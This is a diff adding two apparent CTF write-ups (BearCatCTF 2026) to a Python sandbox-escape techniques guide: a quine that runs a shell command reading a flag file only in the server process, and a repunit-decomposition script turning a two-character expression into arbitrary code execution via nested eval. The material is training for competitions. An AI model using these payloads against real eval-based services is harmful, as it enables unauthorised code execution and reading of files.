@@ -34,6 +34,8 @@
   - [Variations](#variations)
   - [Constraints Checklist for This Technique](#constraints-checklist-for-this-technique)
   - [When __loader__ Is Not Available](#when-__loader__-is-not-available)
+- [Quine + Context Detection for Code Execution (BearCatCTF 2026)](#quine--context-detection-for-code-execution-bearcatctf-2026)
+- [Restricted Character Repunit Decomposition (BearCatCTF 2026)](#restricted-character-repunit-decomposition-bearcatctf-2026)
 - [Hints Cheat Sheet](#hints-cheat-sheet)
 
 ---
@@ -406,6 +408,55 @@ If you have a class `C`:
 - `C.__init__.__globals__` → globals of the module defining `C`
 
 **References:** 0xL4ugh CTF 2025 "Ergastulum" (442pts, Elite), GCTF 2022 "Treebox"
+
+---
+
+## Quine + Context Detection for Code Execution (BearCatCTF 2026)
+
+**Pattern (The Boy is Quine):** Server asks for a quine (program that prints its own source code), validates it by running in a subprocess, then `exec()`s it in the main process with different globals.
+
+**Exploit:** Build a dual-purpose quine that:
+1. Prints itself (passes quine validation in subprocess)
+2. Executes payload only in the server process (detected via globals difference)
+
+```python
+# Context gate: "subprocess" module exists in server globals but not in subprocess
+s='s=%r;print(s%%s,end="");__import__("os").system("cat /app/flag.txt")if"subprocess"in globals()else 0';print(s%s,end="");__import__("os").system("cat /app/flag.txt")if"subprocess"in globals()else 0
+```
+
+**Key insight:** `exec()` in the server process inherits the server's globals (imported modules like `subprocess`), while the subprocess validation has a clean environment. Use `"module_name" in globals()` or `"module_name" in dir()` as a gate to distinguish contexts. The quine structure `s='s=%r;...';print(s%s,end="")` is the classic Python quine pattern.
+
+---
+
+## Restricted Character Repunit Decomposition (BearCatCTF 2026)
+
+**Pattern (The Brig):** Pick exactly 2 characters for your entire expression. Server evaluates `eval(long_to_bytes(eval(expr)))` — the outer eval runs the decoded Python code.
+
+**Strategy:** Choose `1` and `+`. Decompose the target integer into a sum of repunits (111, 1111, 11111, etc.):
+```python
+from Crypto.Util.number import bytes_to_long
+
+target = bytes_to_long(b'eval(input())')  # → 13-byte integer
+
+def repunit(k):
+    return (10**k - 1) // 9  # 111...1 with k digits
+
+terms = []
+remaining = target
+while remaining > 0:
+    k = 1
+    while repunit(k + 1) <= remaining:
+        k += 1
+    terms.append('1' * k)
+    remaining -= repunit(k)
+
+expr = '+'.join(terms)  # e.g., "111...1+111...1+11+1+1"
+# len(expr) ≈ 2561 chars (fits 4096 limit)
+```
+
+**Key insight:** Any positive integer can be written as a sum of repunits (numbers like 1, 11, 111, ...). The greedy algorithm produces ~O(log²(n)) terms. This converts a 2-character constraint into arbitrary code execution via `long_to_bytes()`. On the second unrestricted prompt, run `open('/flag.txt').read()`.
+
+**Detection:** Challenge restricts input character set to exactly 2 characters. Double-eval pattern (`eval(decode(eval(...)))`).
 
 ---
 
